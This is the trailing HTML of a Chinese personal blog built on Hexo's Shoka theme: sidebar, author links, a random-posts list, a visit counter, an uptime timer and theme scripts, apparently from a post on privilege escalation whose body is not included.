rel="bookmark" title="树莓派烧录系统及配置">树莓派烧录系统及配置</a></li><li><a href="/2023/08/01/SAFE/%E5%BE%AE%E4%BF%A1%E6%B6%88%E6%81%AF%E9%98%B2%E6%92%A4%E5%9B%9E/" rel="bookmark" title="微信消息防撤回 群员监控">微信消息防撤回 群员监控</a></li>
        </ul>
      </div>
      <div class="overview panel" data-title="站点概览">
        <div class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <img class="image" itemprop="image" alt=".N1h1l157"
      data-src="/images/avatar.jpg">
  <p class="name" itemprop="name">.N1h1l157</p>
  <div class="description" itemprop="description">人生如逆旅，我亦是行人</div>
</div>

<nav class="state">
    <div class="item posts">
      <a href="/archives/">
        <span class="count">172</span>
        <span class="name">文章</span>
      </a>
    </div>
    <div class="item categories">
      <a href="/categories/">
        <span class="count">6</span>
        <span class="name">分类</span>
      </a>
    </div>
    <div class="item tags">
      <a href="/tags/">
        <span class="count">42</span>
        <span class="name">标签</span>
      </a>
    </div>
</nav>

<div class="social">
      <span class="exturl item github" data-url="aHR0cHM6Ly9naXRodWIuY29tL04xaDFsMTU3" title="https:&#x2F;&#x2F;github.com&#x2F;N1h1l157"><i class="ic i-github"></i></span>
      <span class="exturl item twitter" data-url="aHR0cHM6Ly90d2l0dGVyLmNvbS9YVDcyNzgwMzA4" title="https:&#x2F;&#x2F;twitter.com&#x2F;XT72780308"><i class="ic i-twitter"></i></span>
      <span class="exturl item weibo" data-url="aHR0cHM6Ly9tLndlaWJvLmNuL3Byb2ZpbGUvNTgyOTg0MzUyNQ==" title="https:&#x2F;&#x2F;m.weibo.cn&#x2F;profile&#x2F;5829843525"><i class="ic i-weibo"></i></span>
      <span class="exturl item about" data-url="aHR0cHM6Ly90Lm1lL24xaDFsMTU3" title="https:&#x2F;&#x2F;t.me&#x2F;n1h1l157"><i class="ic i-address-card"></i></span>
      <span class="exturl item email" data-url="bWFpbHRvOjEyMjgwNTc4NjlAcXEuY29t" title="mailto:1228057869@qq.com"><i class="ic i-envelope"></i></span>
      <span class="exturl item facebook" data-url="aHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL3Byb2ZpbGUucGhwP2lkPTEwMDA4NDUzNzQwNTEzNw==" title="https:&#x2F;&#x2F;www.facebook.com&#x2F;profile.php?id&#x3D;100084537405137"><i class="ic i-facebook"></i></span>
</div>

<ul class="menu">
  
    
  <li class="item">
    <a href="/" rel="section"><i class="ic i-home"></i>首页</a>
  </li>

    
  <li class="item">
    <a href="/about/" rel="section"><i class="ic i-user"></i>关于</a>
  </li>

        
  <li class="item dropdown">
      <a href="javascript:void(0);"><i class="ic i-feather"></i>文章</a>
    <ul class="submenu">

        
  <li class="item">
    <a href="/archives/" rel="section"><i class="ic i-list-alt"></i>归档</a>
  </li>

        
  <li class="item">
    <a href="/categories/" rel="section"><i class="ic i-th"></i>分类</a>
  </li>

        
  <li class="item">
    <a href="/tags/" rel="section"><i class="ic i-tags"></i>标签</a>
  </li>

  </ul>
    
  <li class="item">
    <a href="/links/" rel="section"><i class="ic i-magic"></i>友链</a>
  </li>


</ul>

      </div>
    </div>
  </div>

  <ul id="quick">
    <li class="prev pjax">
        <a href="/2022/12/30/SAFE/3%20%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2/" rel="prev" title="上一篇"><i class="ic i-chevron-left"></i></a>
    </li>
    <li class="up"><i class="ic i-arrow-up"></i></li>
    <li class="down"><i class="ic i-arrow-down"></i></li>
    <li class="next pjax">
        <a href="/2022/12/30/SAFE/13%20%E8%A1%A5%E5%85%85%E7%9F%A5%E8%AF%86/" rel="next" title="下一篇"><i class="ic i-chevron-right"></i></a>
    </li>
    <li class="percent"></li>
  </ul>
</div>


        </div>
        <div class="dimmer"></div>
      </div>
    </main>
    <footer id="footer">
      <div class="inner">
        <div class="widgets">
          
<div class="rpost pjax">
  <h2>随机文章</h2>
  <ul>
      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/%E4%B8%96%E7%95%8C%E5%90%8D%E8%91%97/" title="分类于 世界名著">世界名著</a>
</div>

    <span><a href="/2019/07/01/BOOK/56%E3%80%8A%E5%8C%85%E6%B3%95%E5%88%A9%E5%A4%AB%E4%BA%BA%E3%80%8B%E7%A6%8F%E6%A5%BC%E6%8B%9C/" title="《包法利夫人》福楼拜">《包法利夫人》福楼拜</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/MBTI/" title="分类于 MBTI">MBTI</a>
</div>

    <span><a href="/2023/08/01/MBTI/%E8%B1%86%E7%93%A3%E7%BD%91%E5%8F%8B%E5%AF%B9INFJ%E7%9A%84%E6%8F%8F%E8%BF%B0/" title="豆瓣网友对INFJ的描述">豆瓣网友对INFJ的描述</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/VULNHUB/" title="分类于 VULNHUB">VULNHUB</a>
</div>

    <span><a href="/2021/11/01/VULNHUB/136%20GROTESQUE1/" title="VULNHUB 36 GROTESQUE1">VULNHUB 36 GROTESQUE1</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/VULNHUB/" title="分类于 VULNHUB">VULNHUB</a>
</div>

    <span><a href="/2021/11/01/VULNHUB/101%20EVM/" title="VULNHUB 1 EVM">VULNHUB 1 EVM</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/%E4%B8%96%E7%95%8C%E5%90%8D%E8%91%97/" title="分类于 世界名著">世界名著</a>
</div>

    <span><a href="/2019/07/01/BOOK/41%E3%80%8A%E4%BA%BA%E7%94%9F%E7%9A%84%E6%9E%B7%E9%94%81%E3%80%8B%E6%AF%9B%E5%A7%86/" title="《人生的枷锁》毛姆">《人生的枷锁》毛姆</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/%E4%B8%96%E7%95%8C%E5%90%8D%E8%91%97/" title="分类于 世界名著">世界名著</a>
</div>

    <span><a href="/2019/07/01/BOOK/67%E3%80%8A%E8%8B%8F%E8%8F%B2%E7%9A%84%E4%B8%96%E7%95%8C%E3%80%8B%E4%B9%94%E5%BE%B7%E5%9D%A6%C2%B7%E8%B4%BE%E5%BE%B7/" title="《苏菲的世界》乔德坦·贾德">《苏菲的世界》乔德坦·贾德</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/%E6%96%87%E5%AD%A6/" title="分类于 文学">文学</a>
</div>

    <span><a href="/2019/07/01/BOOK/68%E3%80%8A%E7%81%B5%E9%AD%82%E5%8F%AA%E8%83%BD%E7%8B%AC%E8%A1%8C%E3%80%8B%E5%91%A8%E5%9B%BD%E5%B9%B3/" title="《灵魂只能独行》周国平">《灵魂只能独行》周国平</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/%E6%96%87%E5%AD%A6/" title="分类于 文学">文学</a>
</div>

    <span><a href="/2019/07/01/BOOK/31%E3%80%8A%E4%BA%BA%E7%94%9F%E3%80%8B%E8%B7%AF%E9%81%A5/" title="《人生》路遥">《人生》路遥</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/%E6%96%87%E5%AD%A6/" title="分类于 文学">文学</a>
</div>

    <span><a href="/2019/07/01/BOOK/52%E3%80%8A%E8%BF%9D%E8%83%8C%E9%81%93%E5%BE%B7%E7%9A%84%E4%BA%BA%E3%80%8B%E7%BA%AA%E5%BE%B7/" title="《违背道德的人》纪德">《违背道德的人》纪德</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/" title="分类于 信息安全">信息安全</a>
</div>

    <span><a href="/2022/12/30/SAFE/3%20%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2/" title="XD22 3 服务攻防">XD22 3 服务攻防</a></span>
  </li>

  </ul>
</div>
<div>
  <h2>最新评论</h2>
  <ul class="leancloud-recent-comment"></ul>
</div>

        </div>
        <div class="status">
  <div class="copyright">
    
    &copy; 2019 – 
    <span itemprop="copyrightYear">2023</span>
    <span class="with-love">
      <i class="ic i-sakura rotate"></i>
    </span>
    <span class="author" itemprop="copyrightHolder">.N1h1l157 @ Phut Hon</span>
  </div>

<!--   页面字数统计 -->
  <div class="count">
    <span class="post-meta-item-icon">
      <i class="ic i-chart-area"></i>
    </span>
    <span title="站点总字数">906k 字</span>

    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="ic i-coffee"></i>
    </span>
    <span title="站点阅读时长">25:09</span>
&nbsp;&nbsp;
    <!-- 网站总访问量: LeanCloud Counter 数据库中的 time的总和 -->
    <span id="total-visits">总访问量: 加载中...</span>

    <script src="https://cdn.jsdelivr.net/npm/leancloud-storage@4.12.0/dist/av-min.js"></script>
    <script>
      // 获取 Shoka 配置中的 Valine 的 App ID 和 App Key
      var appId = "M0hjFtbBRwOEJlxXsjeK8FSL-gzGzoHsz";
      var appKey = "ggVu0OafepVPwl2xLNtZ38P9";

      // 使用 Valine 的 App ID 和 App Key 进行 LeanCloud 的初始化
      AV.init({
        appId: appId,
        appKey: appKey,
        serverURLs: 'https://m0hjftbb.lc-cn-n1-shared.com' // 请根据您的实际区域选择合适的服务器地址
      });

      // 查询 Counter 类
      const Counter = AV.Object.extend('Counter');
      const query = new AV.Query(Counter);

      // 获取所有数据
      query.limit(1000); // 如果数据量较大，可以适当调整 limit
      query.find().then((results) => {
        // 计算 time 字段的总和
        const totalVisits = results.reduce((sum, result) => sum + result.get('time'), 0);

        // 显示总访问量
        document.getElementById('total-visits').textContent = '总访问量：' + totalVisits;
      }).catch((error) => {
        console.error('获取访问量时出错：', error);
        document.getElementById('total-visits').textContent = '无法获取访问量';
      });
    </script>

  </div>

<!--   自定义开启一个网站的运行时间 -->
  <div class="site-uptime">
    运行时间: <span id="site-uptime"></span>
  </div>
  <script>
    var siteUptimeElement = document.getElementById('site-uptime');
    var siteSetupDate = new Date('2019-06-01'); // 替换为您的网站具体创建日期，格式为 'YYYY-MM-DD'
    setInterval(function() {
      var currentTime = new Date();
      var uptime = formatUptime(currentTime - siteSetupDate);
      siteUptimeElement.textContent = uptime;
    }, 1000);

    function formatUptime(milliseconds) {
      var seconds = Math.floor(milliseconds / 1000);
      var minutes = Math.floor(seconds / 60);
      var hours = Math.floor(minutes / 60);
      var days = Math.floor(hours / 24);

      var uptime = '';
      if (days > 0) {
        uptime += days + '天 ';
      }
      if (hours > 0) {
        uptime += (hours % 24) + '时 ';
      }
      if (minutes > 0) {
        uptime += (minutes % 60) + '分 ';
      }
      uptime += (seconds % 60) + '秒';

      return uptime;
    }
  </script>
  <div class="powered-by">
    基于 <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & Theme.<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FtZWhpbWUvaGV4by10aGVtZS1zaG9rYQ==">Shoka</span>
  </div>
</div>

      </div>
    </footer>
  </div>
<script data-config type="text/javascript">
  var LOCAL = {
    path: '2022/12/30/SAFE/9 权限提升/',
    favicon: {
      show: "Cryp71c3",
      hide: "十年磨一剑"
    },
    search : {
      placeholder: "文章搜索",
      empty: "关于 「 ${query} 」，什么也没搜到",
      stats: "${time} ms 内找到 ${hits} 条结果"
    },
    valine: true,fancybox: true,
    copyright: '复制成功，转载请遵守 <i class="ic i-creative-commons"></i>BY-NC-SA 协议。',
    ignores : [
      function(uri) {
        return uri.includes('#');
      },
      function(uri) {
        return new RegExp(LOCAL.path+"$").test(uri);
      }
    ]
  };
</script>

<script src="https://cdn.polyfill.io/v2/polyfill.js"></script>

<script src="//cdn.jsdelivr.net/combine/npm/pace-js@1.0.2/pace.min.js,npm/pjax@0.2.8/pjax.min.js,npm/whatwg-fetch@3.4.0/dist/fetch.umd.min.js,npm/animejs@3.2.0/lib/anime.min.js,npm/algoliasearch@4/dist/algoliasearch-lite.umd.js,npm/instantsearch.js@4/dist/instantsearch.production.min.js,npm/lozad@1/dist/lozad.min.js,npm/quicklink@2/dist/quicklink.umd.js"></script>

<script src="/js/app.js?v=0.2.5"></script>




<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"jsonPath":"/live2dw/assets/wanko.model.json"},"display":{"position":"right","width":140,"height":260},"mobile":{"show":true},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
</html>
